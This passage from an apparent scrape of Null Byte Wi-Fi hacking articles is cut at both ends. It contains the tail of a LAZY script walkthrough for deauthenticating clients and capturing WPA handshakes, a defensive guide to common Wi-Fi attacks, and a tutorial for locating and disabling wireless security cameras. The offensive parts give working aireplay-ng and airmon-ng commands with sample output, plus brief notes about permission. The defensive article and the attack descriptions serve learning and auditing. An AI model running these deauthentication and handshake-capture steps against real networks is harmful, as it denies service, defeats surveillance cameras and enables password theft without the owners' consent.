kick someone or something off the network you are targeting and capture the network handshake of the device reconnecting to the network.\nWith this handshake, you can crack the hash with a brute-force attack. This tried-and-true method is one of the most critical vulnerabilities in WPA and one of the significant things that was fixed in the new WPA3.\nAfter returning to the main menu, we can try out one of LAZY script's top-menu functions, which is to capture a WPA (or WPA2) handshake for later cracking. If you have a Kali compatible wireless network adapter, you should have supplied this name to LAZY script in Step 3 above, or you can do so now by typing interfaces and setting the name of the adapter in station and monitor mode.\n* Don't Miss: Use Leaked Password Databases to Create Brute-Force Wordlists\nOnce this is set, we can choose option 10 to select the handshake menu. First, you'll need to confirm that you want to put the adapter into monitor mode if you haven't already. Just type y to confirm and place the adapter into monitor mode. When this is done, a new terminal window will open. You'll see that no handshake is selected and a list of the attack options.\n----------------------------HANDSHAKE----------------------------\n1) Scan networks nearby     Selected:None\n2) Capture handshake\n3) Aircrack the handshake\n4) Verify a handshake\n5) Clean a handshake\n6) Remove .csv and .netxml files\nYou can select option number 1 to scan for networks nearby, and you'll see a list of nearby network traffic. Let this run for a minute or two, and then press Crtl-C to stop the scan.\nCH 12 ][ Elapsed: 6 s ][ 2018-07-04 04:33\nBSSID               PWR   Beacons   #Data,  #/s    CH    MB     ENC   CIPHER  AUTH  ESSID\n00:25:00:FF:94:73    -1         0       1     0     6    -1     OPN                 <length:  0>\n70:3A:CB:DB:5A:78   -41        11       3     0    11    130    WPA2  CCMP    PSK   takeyourgodd\n70:3A:CB:DB:5C:A8   -59        22       0     0     6    130    WPA2  CCMP    PSK   takeyourgodd\n70:3A:CB:DB:5C:B4   -71         6       0     0     1    130    WPA2  CCMP    PSK   takeyourgodd\nC4:8E:8F:E5:6A:B4   -75         7       0     0     1    195    WPA2  CCMP    PSK   TG1672G12\nBSSID               STATION         PWR   RATE      Lost    Frames  Probe\n00:25:00:FF:94:73   obfuscated      -43    0 -12      21         8\n00:25:00:FF:94:73   obfuscated      -33    0 -12     104         4\n00:25:00:FF:94:73   obfuscated      -51    0 -12     107         4\n00:25:00:FF:94:73   obfuscated      -53    0 -12      34         8\n(not associated)    obfuscated      -70    0 - 1      12         8\nYou'll see a list of networks that have traffic on them, allowing you to find targets for the next stage of the attack. This comes along with a handy color code. Select the number of the target network and press return to continue. It's worth noting you can go back to this screen to select another network by typing b in any later step, saving you from needing to scan a second time.\nAfter selecting our target network, we'll be presented with the option to either supply a file name to save the handshake to or choose 0 to not keep a file for this session. Here, name the file something you'll remember later.\nAfter entering a name and pressing return, a new window will open presenting you with options for kicking devices off the network. Select option 1 to deauthenticate all clients and get the network handshake quickly. Make sure you have permission to do this on the network you're working on, as you'll be denying service to the network you target until you get the handshake. As a final input, select the number of deauth packets to send, with 0 being a continuous stream until you decide to quit.\n----------------DEAUTH MENU----------------\n1) Deauth all                   aireplay-ng\n2) Deauth all                   mdk3\n3) Deauth client/s              aireplay-ng\n4) Deauth all periodically      aireplay-ng\n-------------------------------------------HANDSHAKE-------------------------------------------\nCH 11 ][ Elapsed: 12 s ][ 2018-07-04 04:33\nBSSID               PWR  RXQ  Beacons   #Data,  #/s  CH   MB   ENC    CIPHER  AUTH  ESSID\n70:3A:CB:DB:5A:78   -40   87      134      92     6  11  130   WPA2   CCMP    PSK   takeyourgodd\nBSSID               STATION         PWR     Rate      Lost  Frames  Probe\n70:3A:CB:DB:5A:78   obfuscated      -72      0 - 0      22       6\nA new window will open, showing the status of the deauthentication attack. When you see the \"WPA handshake\" appear in the top right corner, you know you've gotten the handshake for the network. Press Ctrl-C to stop the deauth attack.\n----------------DEAUTH MENU----------------\n1) Deauth all                   aireplay-ng\n2) Deauth all                   mdk3\n3) Deauth client/s              aireplay-ng\n4) Deauth all periodically      aireplay-ng\nENTER) Last option\n-------------------------------------------HANDSHAKE-------------------------------------------\nCH 11 ][ Elapsed: 2 mins ][ 2018-07-04 04:36 ][ WPA handshake: 70:3A:CB:DB:5A:78\nBSSID               PWR  RXQ  Beacons   #Data,  #/s  CH   MB   ENC    CIPHER  AUTH  ESSID\n70:3A:CB:DB:5A:78    -7  100     1307     151     2  11  130   WPA2   CCMP    PSK   takeyourgodd\nBSSID               STATION         PWR     Rate        Lost  Frames  Probe\n70:3A:CB:DB:5A:78   obfuscated      -33      1e - 1e       0      12\n---------------------------------DEAUTHING---------------------------------\n04:36:17 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:18 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:18 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:19 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:19 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:19 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:20 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:20 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:21 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:21 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:22 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:22 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:23 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\n04:36:23 Sending DeAuth (code 7) to broadcast -- BBSID: [70:3A:CB:DB:5A:78]\nAfter selecting the network, you'll be in the \"handshake\" menu. Here, we can confirm the handshake we just captured by selecting option 4 which is to verify a handshake.\n----------------------------HANDSHAKE----------------------------\n1) Scan networks nearby     Selected:takeyourgoddamnshoesoff\n2) Capture handshake\n3) Aircrack the handshake\n4) Verify a handshake\n5) Clean a handshake\n6) Remove .csv and .netxml files\nIn the deauth menu, you'll see the options for verifying you've successfully captured a handshake. Select option 2 to check the handshake with Cowpatty.\n* Don't Miss: Cracking WPA2-PSK Passwords with Cowpatty\n-------DEAUTH MENU-------\n1) Check with pyrit\n2) Check with cowpatty\n-------------------------------------------HANDSHAKE-------------------------------------------\nCH 11 ][ Elapsed: 12 s ][ 2018-07-04 04:37\nBSSID               PWR  RXQ  Beacons   #Data,  #/s  CH   MB   ENC    CIPHER  AUTH  ESSID\n70:3A:CB:DB:5A:78   -40  100      156       0     0  11  130   WPA2   CCMP    PSK   takeyourgodd\nBSSID               STATION         PWR     Rate        Lost  Frames  Probe\nHere, you can see our handshake is valid:\n-------DEAUTH MENU-------\nValid handshake found!\n-------------------------------------------HANDSHAKE-------------------------------------------\nCH 11 ][ Elapsed: 12 s ][ 2018-07-04 04:37\nBSSID               PWR  RXQ  Beacons   #Data,  #/s  CH   MB   ENC    CIPHER  AUTH  ESSID\n70:3A:CB:DB:5A:78   -37   96      297       0     0  11  130   WPA2   CCMP    PSK   takeyourgodd\nBSSID               STATION         PWR     Rate        Lost  Frames  Probe\nAfter confirming the handshake is valid, you'll be dropped back into the handshake menu. Select option 0 to exit the script.\n----------------------------HANDSHAKE----------------------------\n1) Scan networks nearby     Selected:takeyourgoddamnshoesoff\n2) Capture handshake\n3) Aircrack the handshake\n4) Verify a handshake\n5) Clean a handshake\n6) Remove .csv and .netxml files\nOn your way out, the script will ask if you captured a WPA handshake. If you did, make sure to type y to save the handshake you captured under the filename you provided earlier. Otherwise, the file will be discarded. If you're keeping the file, you can also type y for cleaning the file, which will make it smaller by getting rid of all the non-relevant packets that were captured.\nAt this point, we would run a brute-force attack against this with Aircrack-ng. I tried LAZY script's built-in brute forcer, but it wasn't able to properly read the location of my dictionary file, so I don't recommend it in its current iteration.\nStep 7: Use a WPS Pixie-Dust Attack (A Work in Progress)\nWhile LAZY script does include a WPS module, the versions I tried in virtual machines and on a Kali laptop weren't able to successfully crack our test WPS PIN. Two of the primary attacks returned \"too many arguments\" rather than any useful results. The final option, a Pixie-Dust loop, ended in an error after an anticlimactic buildup.\n* Don't Miss: Hack WPA & WPA2 Wi-Fi Passwords with a Pixie-Dust Attack\nNetwork Hacking for the Lazy\nLAZY script is a tool that attempts to bring together the best tools with a minimum of interaction, stitching together popular hacking tools with a series of clever shell scripts. This makes the necessary tactics of Wi-Fi hacking, such as WPA brute-forcing, accessible to even the most inexperienced users.\nIf you've become lazy with your Wi-Fi security at home, this is a wakeup call that you need to take things like setting your Wi-Fi password seriously. Don't pick a password which is short or easy to guess or one that you've already used in many other places. If you need a refresher on how to keep your own Wi-Fi safe, you can check out my previous guide on defending against the main types of Wi-Fi hacking, most of which LAZY script includes.",
        "category": "Wifi Hacking"
    },
    {
        "title": "The Beginner's Guide to Defending Against Wi-Fi Hacking",
        "link": "https://null-byte.wonderhowto.com/how-to/beginners-guide-defending-against-wi-fi-hacking-0185217/",
        "content": "* WonderHowTo\nHacking Wi-Fi is a lot easier than most people think, but the ways of doing so are clustered around a few common techniques most hackers use. With a few simple actions, the average user can go a long way toward defending against the five most common methods of Wi-Fi hacking, which include password cracking, social engineering, WPS attacks, remote access, and rogue access points.\nOur video covers everything you need to know, but you can also read through the article below for more details on each method. And, of course, it's always here if you like following written guides more than video tutorials.\nMethod 1: Password Cracking\nPassword cracking is a tried-and-true method of breaking into a Wi-Fi network that generally relies on the user picking a bad password. While there are many ways this attack can unfold, in general, there are two ways that a user can be fall victim to this attack.\nThe first is by taking advantage of a target using an insecure type of encryption called WEP to lock their Wi-Fi rather than the more modern WPA that is standard for most networks. Using a WEP key allows even a sophisticated password to be broken in minutes, rendering it not very effective.\nThere are many tools available to hack WEP networks, but simple command-line programs like Besside-ng are able to locate and crack WEP networks using Kali-compatible wireless network adapters.\n* More Info: Hunting Down & Cracking WEP-Protected Wi-Fi Networks\nAircrack-ng 1.2 rc4\n[00:00:02] Tested 14115 keys (got 20198 IVs)\nKB  depth   byte(vote)\n0  0/  1   61(30208) 68(26112) DC(26112) E3(24832) 5D(24576) 6E(24576) ED(24320) 08(24064) 43(24064)\n1  1/ 16   4C(26368) BD(26112) 6F(25600) AE(25088) 00(25088) A5(24832) A6(24576) A4(24320) EF(24320)\n2  0/ 36   46(25856) CE(25600) D1(25088) DE(24832) E1(24832) 89(24832) C7(24576) C8(24320) E3(24320)\n3  1/  4   79(26880) 10(25088) 25(25008) 51(24832) 6F(24832) D2(24832) 45(24576) 6C(24576) 70(24576)\n4  1/  8   4F(27648) 64(26368) E4(25600) 5D(25600) 97(25344) FD(25088) 05(25088) AC(24576) 59(24320)\nKEY FOUND! [ 61:4C:46:32:4F ] (ASCII: aLF20 )\nDecrypted correctly: 100%\nroot@skickar:~# _\nThe second kind of password cracking attacks the more secure WPA method of encryption and involves brute-forcing the password. By kicking devices off the target network for a few seconds, a hacker can force devices to connect back to the network and exchange a sequence of packets called a four-way handshake.\nThis handshake is enough for a hacker to go home and try guessing a huge list of passwords against the captured handshake. Using their computer's processing power, a hacker can try millions of passwords very quickly, allowing them to break bad passwords in minutes or hours. The tools for WPA cracking are increasingly sophisticated and include Airgeddon, Besside-ng, and Aircrack-ng. These tools can be used to capture and crack network passwords from the intercepted handshake.\nFor the end user, this means that you must assume that anyone could grab a four-way handshake from your network. If your password is weak or you use it in other places, that could be serious cause for concern depending on how much time an attacker has to spend brute-forcing it.\n* More Info: How to Automate Wi-Fi Hacking with Besside-ng\nSolution: Better Passwords\nHackers rely on a few common habits to be effective with password cracking. Using stolen passwords which have been harvested from real user accounts is a common tactic that preys on the tendency for users to reuse their favorite passwords, increasing the chance that the passwords will be lost by some service you've signed up for. Don't reuse passwords as a rule, because that forces you to trust every service you sign up for to never lose your password.\nUsing password managers like LastPass and KeePassX can make it easier to use unique passwords, but you should avoid passwords like phone numbers, addresses, or anything especially obvious. Instead, choose longer passwords that are unique and don't rely on any information or interests you've made public.\n* Instructions: How to Create Stronger Passwords (Advice from a Real Hacker)\nYou can also use tools to detect whether someone has joined your network that doesn't have permission to. By downloading the free, cross-platform Fing application to your smartphone, you can scan and take an inventory of any network you are connected to. If a device is connected that shouldn't be, you have the proof that an unauthorized user is connected and can take steps to kick them out by changing the password or resetting the router.\nImage by SADMIN/Null Byte\nMethod 2: Social-Engineering Attacks\nSocial-engineering attacks can look very different, and this is partially what makes them so hard to spot. Generally, a social-engineering attack will rely on tricking the user rather than using a technical exploit, so a victim may not realize anything has happened.\n* More Info: How to Use Persuasion to Compromise a Human Target\nThere are a lot of reasons why you shouldn't give someone your work or home Wi-Fi password, and very few reasons why you should if you don't trust them. It's important to remember a few facts about Wi-Fi:\n* Wi-Fi allows direct communication with devices on your network, like webcams, desktop computers, and other devices that may be wired rather than wireless. Having the Wi-Fi password means you can attempt to log into or attack these devices.\n* Having the Wi-Fi password can allow an attacker to change the information you or others on your network see when you visit webpages or use the internet.\n* Once someone is into your network, they can access the router and build a persistent remote backdoor, preventing you from kicking them out even if you change the password.\nPasswords are easy to give out, but once someone has access, it's hard to dislodge them. Image by SADMIN/Null Byte\nKnowing this, a social engineer may attempt to approach someone who knows the Wi-Fi password to gain access. This may be as obvious as a stranger who has no reason for having the Wi-Fi other than simply asking for it or as elaborate as calling the target as the target internet service provider and asking an employee help them fix a problem with the internet.\nSolution: Always Be Suspicious\nWhen recognizing a social-engineering attack, you can generally spot a few things that could tip you off that someone wants access to something they're not supposed to have. If someone presents a story where the solution is to hand over your Wi-Fi credentials, try to present an alternative solution, like \"I can look that up for you,\" and see if they pivot to stay focused on the password.\nMany networks include the ability to create a guest network that does not allow for communication with other devices on the network, preventing users from logging into the router or trying to brute-force passwords. These systems should also be isolated from anything critical, and guest networks should restrict any users to their own subnets to minimize the risk of a password being shared. It's also recommended to change your Wi-Fi password periodically, at least once every six months or so, and keep track of who has access.\nFinally, practice the principle of least privilege, meaning only give out your password on a need-to-know basis. If someone has a burning desire to get the Wi-Fi password, ask yourself why, and treat it as seriously as giving out a PIN for a bank account. If you don't have the time to secure your network above and beyond what the average person does, don't risk letting anyone in that you don't trust.\nMethod 3: WPS PIN Attacks\nWPS setup PIN attacks have been widely used since they were discovered, enabling brute-forcing attacks like Reaver to chew through possible setup PIN guesses and break into any affected router in around seven hours. This is due to poor choices in the way the password is validated, and the attack completely bypasses the password set by the user. Even with the most secure, secret password in the world, a router vulnerable to Reaver can be broken into and completely pwned by anyone in range.\nThe WPS setup PIN typically can't be changed, unlike a password. Image by audioreservoir/Flickr\nWhile Reaver was scary enough, a new generation of vulnerabilities emerged with the development of WPS Pixie-Dust. This attack took advantage of flaws in the way many routers set random values and dramatically changed the way that hackers took advantage of WPS setup PINs. With WPS Pixie-Dust, an affected router could be compromised in minutes or seconds, not hours.\n* More Info: Hack WPA & WPA2 Wi-Fi Passwords with a Pixie-Dust Attack\nOnce an attacker has your WPS setup PIN, they will always be able to dump your router's password, no matter how many times you change it. Since many routers do not let you change the PIN, this means the router is permanently compromised as long as the setting is left enabled. This will often also get them administrative access to the router and represents a huge hole in the security of a network that has otherwise strong security.\nSolution: Disable WPS & Verify with Testing\nWhile many routers offer the convenience of WPS setup PINs, most can be disabled to prevent Reaver or Pixie-Dust attacks from succeeding. To do so, you'll need to log into the settings of your router and look for the part of the page that references the \"WPS Setup\" or \"WPS Access\" settings. Once there, disable the WPS setup PIN. Once this is done, restart the router and check to see if the setting is still disabled.\nWhile this may be enough for some routers, some older models may say they've disabled the WPS setup PIN when in reality they still respond to WPS and Pixie-Dust attacks. If you suspect this may be the case, it would be wise to run a tool like Wash, which will locate every network nearby which has the WPS PIN enabled. If your router appears on this list even after you changed the setting, it's probably time to buy a new router.\nOn Kali Linux, you can run the wash command if you have a compatible wireless network adapter. If you do, put it into monitor mode and type the following to display any nearby vulnerable networks.\nwash -i {monitor-interface}\nYou should see something like the output below. Here, we can see a network called TRENDnet on channel 9 using WPS version 1.0. This means the device either has the setting enabled or it might not be possible to disable the setting on that particular model of router.\nroot@kali:~/reaver-wps-fork-t6x/src# wash -i mon0\nWash v1.5.2 WiFi Protected Setup Scan Tool\nCopyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>\nmod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212 & Wiire & kib0rg\nBSSID                Channel   RSSI   WPS Verison   WPS Locked    ESSID\n--------------------------------------------------------------------------------------\nD8:EB:97:13:BF:D9       9       00        1.0           No       TRENDnet\nMethod 4: Remote-Access Attacks\nWhile remote access can be a handy feature, having this feature turned on by default is a terrible idea. The reason this is ill-advised stems from the way devices are discovered and indexed on services like Shodan. This search engine indexes any devices with ports which are directly exposed to the internet, such as IP cameras, routers, and IoT devices. While this should not be enabled by default, many devices come with this setting enabled for convenience and also come set with easy-to-guess default credentials.\nImage by OccupyTheWeb/Null Byte\nThe risk of remote access comes from two different sources, external and internal. Once a device has been discovered by Shodan, it's only a matter of time before someone, be it a hacker or a bot, tries to log in. When they do, an external attacker will usually be relying on a list of default passwords for that particular device. Once in, they can pivot to other devices in the network. This is especially bad if the router is exposed because an attacker compromising the router can take over the entire network.\n* Don't Miss: How to Automate Shodan Scans for Vulnerable Devics with Python\nThe internal risk of this attack is that someone with temporary access via LAN or the Wi-Fi password can enable remote administration and then simply leave and bide their time. Any time they want to connect to the network remotely, they can simply log in with the credentials they set up to do so. Many times routers will have this feature and make easy to enable, allowing an attacker to take advantage of momentary access to plant a permanent back door.\nSolution: Disable Remote Access & Port Forwarding\nThe first step you can take to ensure your devices aren't exposing ports directly to the internet is to log into the administrative portal and look for a tab that mentions \"Port Forwarding\" rules or settings. This is the section of the router where you can add port forwarding rules, and it may be located under the \"Advanced\" tab on some devices. When you find the page, you should expect to see no port forwarding rules there, as seen in the image below.\nImage by Takhion/Null Byte\nIf, however, your router's port forwarding page already has rules entered, you will want to immediately determine if they were enabled for a legitimate or necessary reason. If not, you should disable these settings immediately. While these rules may allow things like access to webcams from an external network or an app, if you don't recognize them, it's generally not worth the risk.\nMethod 5: Rogue Access Points\nA rogue access point is a W-Fi network designed to trick users into connecting. After doing so, it's capable of stealing passwords, controlling your internet experience, and spying on connected devices. Hackers deploying rouge access points don't need an expensive setup, as there are tools like the Wi-Fi Pumpkin which run on simple, low-cost hardware like the Raspberry Pi.\n* More Info: Build a Pumpkin Pi, a Pocket-Sized Rogue AP & MITM Framework\nA simple setup like this can force a user off their normal network with a series of deauthentication attacks. Once the frustrated user finds they can't use their normal network, a similarly named network with no password is provided to tempt the user.\nImage by SADMIN/Null Byte\nAfter connecting, this fake network will often act like the router is installing an update or otherwise restarting, and request a password to reboot. While this might seem suspicious, the average user focusing on their work will simply be wanting to deal with the distraction quickly, often entering their Wi-Fi password without a second thought.\nTools like Airgeddon allow tremendous flexibility for a hacker in creating fake APs, and the \"Evil Twin attack\" module uses a customizable phishing page to allow hackers to automatically generate phishing pages in different languages. While these attacks are impressive, the reason they work is that they trick a user into connecting to a network other than one they trust.\n* More Info: Stealing Wi-Fi Passwords with an Evil Twin Attack\nThe way your laptop and phone searches for Wi-Fi can also be enough to take over your connection if you use a lot of free Wi-Fi networks that don't require a password. When your phone or laptop sends probe frames asking if any recently connected to networks are available, attackers can create a fake Wi-Fi network with the same name as the one your device is searching for. If the network didn't have a password, your device will connect seamlessly without warning you.\nSolution: Spot Signs of a Rogue AP\nWhen you're using Wi-Fi, you should always be aware of what network your computer is connected to. It's easy to test this by turning on the personal hotspot on your phone and naming the network the name of a coffee shop you've used the Wi-Fi of lately and no password. If your computer connects automatically, it's likely that you wouldn't even know if an attacker were to take over your internet connection.\nThe ways that computers store the wireless networks they've joined isn't very smart, and most computers will automatically join any network with the same name of a network they've joined before. The exception to this rule is if the network has different security settings from the one that was visited prior, like suddenly requiring a password.\nOn Windows, you can disable the setting of automatically connecting when in range.\nYou should go into your computer's Wi-Fi settings and delete any networks you no longer wish to connect to. Above, you can see the wireless settings for a network on a Windows system. Below, a macOS system provides the options to prioritize or delete networks previously joined.\nIf you don't want your computer's connection to be taken over by a random network you forgot you connected to weeks ago, make sure to delete these and test to make sure your computer doesn't connect to networks with the same name.\nNext, it's smart to avoid connecting to unknown networks whenever possible, and instead, use your phone's hotspot or a trusted network. Make sure to use a VPN whenever possible to ensure that even if your connection is intercepted, it won't be as easy as injecting content into webpages to steal your credentials. Even while using a VPN, be suspicious whether it's connecting to a conveniently available \"Google Starbucks\" Wi-Fi network miles from the nearest coffee shop or just resorting to using a new one when your trusted network doesn't work.\nStay Safe Out There!\nWi-Fi hacking can take many forms, but by hardening your defenses and ensuring there are no easy routes into your network, you can make it a lot harder for someone wanting to break into your network. There are two parts to staying safe when it comes to Wi-Fi, securing your personal Wi-Fi network, and ensuring you're being careful and skeptical when you're using any network you don't control.\nIn general, VPN services are helpful because they allow you to create an encrypted tunnel of traffic that prevents the owner of the traffic from seeing what you're doing, but this doesn't by any means protect you from the other risks of connecting to unknown networks. Stay safe, and if you need to use Wi-Fi and the only option is a network you don't trust, consider using your phone's hotspot instead.\nI hope you enjoyed this guide to defending against Wi-Fi hacking! If you have any questions about this tutorial or Wi-Fi hacking guides, feel free to leave a comment or reach me on Twitter @KodyKinzie.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Disabling Security Cameras on Any Wireless Network with Aireplay-Ng",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-wi-fi-disabling-security-cameras-any-wireless-network-with-aireplay-ng-0185435/",
        "content": "* WonderHowTo\nElectronic warfare tactics work by jamming, disrupting, or disabling the technology a target uses to perform a critical function, and IoT devices are especially vulnerable to attacks. Wireless security cameras like the Nest Cam are frequently used to secure critical locations, but a hacker can surgically disable a webcam or other Wi-Fi connected device without disturbing the rest of the network.\nIn general, IoT devices are notorious for having open ports, default (and often hard-coded) passwords, and other serious security flaws which anyone connected to the same Wi-Fi network could potentially exploit. If you are connected to the same Wi-Fi network as a security camera, or the camera is connected to a network with no password, it is possible to do more than just disable the device. This includes attempting to log in to the camera itself.\nIn spite of the risk IoT devices pose, cameras and other Wi-Fi connected sensors are marketed as being capable of securing or monitoring many important things, making the Wi-Fi networks they're attached to a valuable target for hackers.\nWhile we discussed how to use Airgeddon to jam Wi-Fi networks completely, full-scale denial-of-service attacks aren't stealthy and will cause widespread disruption on the whole network, calling too much attention to what you're doing. In some cases, it's better to target a single host device on a particular network, such as a Wi-Fi security camera, without affecting the entire network.\n* Don't Miss: How to Build a Software-Based Wi-Fi Jammer with Airgeddon\nA hacker or pentester can turn up information during recon that shows interesting devices attached to the target network. Using Kismet or Airodump-ng, passive Wi-Fi recon tools, he or she can identify access points that are actively exchanging data, read packets out of the air, and display information about the source. A targeted network can then be broken down to see the individual sources of the packets being exchanged, in other words, a list of every device connected.\nTaking a stroll around a target facility would be enough to walk away with a list of every wireless device in use on the network — without having the network's password. From that list, he or she can identify devices by the MAC address, as well as other details about the Wi-Fi configuration such as default hotspot names.\n* Don't Miss: How to Wardrive with the Kali Raspberry Pi to Map Wi-Fi Devices\nWhile you would expect to see Wi-Fi security cameras, connected thermostats, music players, TV streaming devices, Wi-Fi remotes, and printers, there are less common Wi-Fi connected devices you may come across. This is illustrated by the ability to identify and map the location of Wi-Fi enabled sex toys (a practice named \"screwdriving\") which either use an app over Wi-Fi for to control the device or, more horrifically, to stream video from a camera.\nThe tactics we're discussing today will disable any of these devices which do not have an Ethernet backup. Before anyone asks, yes, this means you could theoretically build a script that freezes all Wi-Fi-controlled sex toys in range everywhere you go. Why someone would build such a weapon I do not know, but in this example, we will focus on the more commonly seen Wi-Fi security camera.\nWhat You'll Need to Get Started\nTo get started, you'll need Kali Linux or another Linux distro like Parrot Security or BlackArch that has the ability to run Aireplay-ng. You can run this from a virtual machine, a live USB install, or a hard drive installation.\nNext, you'll need a wireless network adapter that allows for packet injection and monitor mode, since you'll need be able to scan the area to locate the device you wish to disconnect. You'll also need to send packets that pretend to be from the access point the device is connected to.\nRecommended Adapter: The Alfa AWUS036NH 2.4 GHz for $35 on Amazon\nStep 1: Update Kali\nWith those two requirements taken care of, you can get started by making sure your system is fully up to date. In Kali, the command to do can be seen below.\nAfter this, you should be ready to go, but make sure you have a target you have permission to access (and deny service to) with the Aireplay-ng tool. While you can scan any network you want with Kismet, Aireplay-ng will execute a denial-of-service attack that is illegal to run against a network you don't have permission to audit.\nStep 2: Choose Your Weapon\nThe first step in identifying wireless targets is to conduct passive recon on the wireless environment. To do this, we can use a program called Kismet which can perform wireless signals intelligence in a passive and undetectable fashion. The advantage of this is that by simply being in proximity to your target, you can observe the wireless traffic in the area and later parse the information to find interesting devices.\n* More Info: Use Kismet to Watch Wi-Fi User Activity Through Walls\nAn alternative to Kismet is running Arp-scan, which can be configured in a number of ways to filter information further about the networks you discover. While this does work, sometimes the output takes more work to decipher. We'll be using Kismet, however, for the rest of this guide.\nStep 3: Put the Wireless Adapter in Monitor Mode\nTo start scanning with either tool, we'll need to put our wireless network adapter into monitor mode. We can do so by typing the following, assuming wlan0 is the name of your wireless card. You can get the name of your wireless card by running ifconfig or ip a to list the available network interfaces.\nsudo airmon-ng start wlan0\nOnce the command runs, you can run ifconfig or ip a again to confirm the card is in monitor mode. It should now be named something like wlan0mon.\nStep 4: Start Up Kismet on the Network\nOnce monitor mode is taken care of, we can start Kismet by typing the following.\nkismet -c wlan0mon\nIn this command, we are specifying which network adapter to use with Kismet with the -c (client) flag. We should see something like the output below. You can press Tab, then Return, to close the console window and show the main screen.\nStep 5: Discover Wireless Security Cameras with Kismet\nWe can now scroll through the network and attempt to identify interesting devices. If you can't do this, you may need to enable more options under the \"Preferences\" menu to see the source of packets. You can access this through the \"Kismet\" menu seen below.\nOnce Kismet is running, you can start to look up the manufacturer of any devices that look like they might be a security camera. Here, we have found a likely device, which Kismet tells us is made by \"Hangzhou.\" You can see its MAC address is A4:14:37:44:1F:AC.\nWe can look into this in more detail due to the way that MAC addresses are assigned. Because the first six numbers and letters are assigned to a particular organization, I was able to quickly look up the name of the company that makes this device along with \"A41437.\"\nTaking the full name of the company, in this case, Hangzhou Hikvision Digital Technology, a simple Google search reveals their product line. As luck has it, they are a company that makes wireless surveillance cameras.\nThis company sells wireless cameras.\nNow we have three pieces of critical intelligence: the name and BSSID of the Wi-Fi access point the camera is on, the channel the network is broadcasting on, and the BSSID addresses of the camera itself. You can press Ctrl-C to close Kismet.\nIt's worth noting that if a security camera only starts to record or send data when it sees motion, a hacker could sit nearly a mile away and just record when the camera is sending traffic to know when someone is moving in front of the camera, even if they couldn't see what the camera was seeing directly.\nWith all this information, a discovery like a door being monitored by a streaming camera connected to a DVR would mean that we can expect the device to stop functioning when disconnected. We can take all of the information we found and use Aireplay-ng to disable the connection.\nStep 6: Execute the Deauthentication Attack\nTo begin disrupting the connection to the device we've targeted, we'll need to lock our wireless network to the channel we observed traffic on. We can do this by typing the following commands, assuming we want to lock the network adapter to channel 6.\nairmon-ng start wlan0mon 6\nNow that our card is on the correct channel, we can direct the command which will disconnect the device we've located. The command we will use to do this is formatted like this:\naireplay-ng -0 0 -a <bssid of access point> -c <bssid of client device> <name of the adapter>\nTo break down what the commands above are doing:\n* -0 will set the attack option to option 0, a deauthentication attack which will send authentication packets pretending to be from the access point to the device. The 0 that follows indicates to send a continuous stream of deauthentication packets, but you can also choose a fixed number to send here.\n* -a will set the BSSID of the Wi-Fi access point that the device is connected to.\n* -c will set the BSSID of the device we wish to kick off the network.\nOur final command for our example would be as follows.\naireplay-ng -0 0 -a f2:9f:c2:34:55:64 -c a4:14:37:44:1f:ac wlan0mon\nOnce this command executes, it will continue to jam the Wi-Fi connection between the two devices until you cancel the command by hitting the Ctrl-C key combination.\nDefending Against This Type of Attack\nTo prevent your network devices from being targeted, the best solution is using Ethernet. While a lot less convenient than Wi-Fi, it doesn't allow the connection to be manipulated or suddenly cut off at critical times from an outsider without physical access. Because this is always a possibility with Wi-Fi, it's just not very well suited to doing this kind of job in a setting where it may be attacked.\nWhile some users try tactics like making your network \"hidden\" to evade these sorts of attacks, this will simply invite much more attention and curiosity than it will actually protect your network. Any camera or device actively using Wi-Fi will betray its connection to a tool like Kismet, meaning the best solution is to simply not use Wi-Fi when possible.\nIf you absolutely must, reducing the power of your Wi-Fi access point to prevent the signal from reaching needlessly far can help make it more difficult to read this information, but most IoT devices do not include this functionality.\nInternet of Things Devices Have Serious Drawbacks\nWith the ability to selectively disable any Wi-Fi dependent device, hackers can exploit this ability to take advantage of situations relying on these devices for security. It's up to people using and deploying these devices to keep them updated and in roles that are appropriate for their abilities. In this case, it's clear that a Wi-Fi dependent security camera cannot be relied upon to provide continuously streamed coverage of important areas.\nI hope you enjoyed this guide to targeting and disabling IoT devices like Wi-Fi cameras with Aireplay-ng! If you have any questions about this tutorial or Wi-Fi recon and exploitation, feel free to leave a comment below or reach me on Twitter @KodyKinzie.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Hack WPA2 Wi-Fi Passwords Using Jedi Mind Tricks (& USB Dead Drops)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-wpa2-wi-fi-passwords-using-jedi-mind-tricks-usb-dead-drops-0185290/",
